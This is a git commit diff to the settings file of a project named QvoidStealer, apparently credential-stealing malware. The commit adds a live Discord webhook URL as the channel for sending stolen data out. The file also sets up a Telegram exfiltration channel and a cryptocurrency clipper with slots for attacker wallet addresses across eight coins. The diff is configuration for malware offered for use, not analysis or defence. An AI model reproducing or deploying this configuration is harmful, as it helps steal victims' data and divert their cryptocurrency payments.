efc09e42eb96ee84a7ae7ae44536ea410e208a1e
BatMan <81291690+BatMan-9999@users.noreply.github.com>
2022-12-01 21:29:06 +0100

    Update Settings.cs

--- QvoidStealer/QvoidStealer/Main/Settings.cs
+++ QvoidStealer/QvoidStealer/Main/Settings.cs
@@ -4,7 +4,7 @@ namespace QvoidStealer.Main
 {
     class Settings
     {
-        public static DiscordWebhook Webhook = new DiscordWebhook("WEBHOOK_HERE");
+        public static DiscordWebhook Webhook = new DiscordWebhook("https://discord.com/api/webhooks/1047972366912851999/45Ker-7MMu5yBIoi6iK9_1COSWaaJlzhBs37jy7kPD7x_WKGtJTPY8cu92Go1h1gh87c");
         public static TelegramAPI Telegram = new TelegramAPI("%TELEGRAM_TOKEN_HERE%", 0/*%TELEGRAM_CHAT_ID_HERE%*/);
         public static CryptoClipper Clipper = new CryptoClipper("BTC_ADDRESS_HERE_", "ETH_ADDRESS_HERE_", "DODGE_ADDRESS_HERE_", "LTC_ADDRESS_HERE_", "XMR_ADDRESS_HERE_", "DASH_ADDRESS_HERE_", "NEO_ADDRESS_HERE_", "XRP_ADDRESS_HERE_");
 
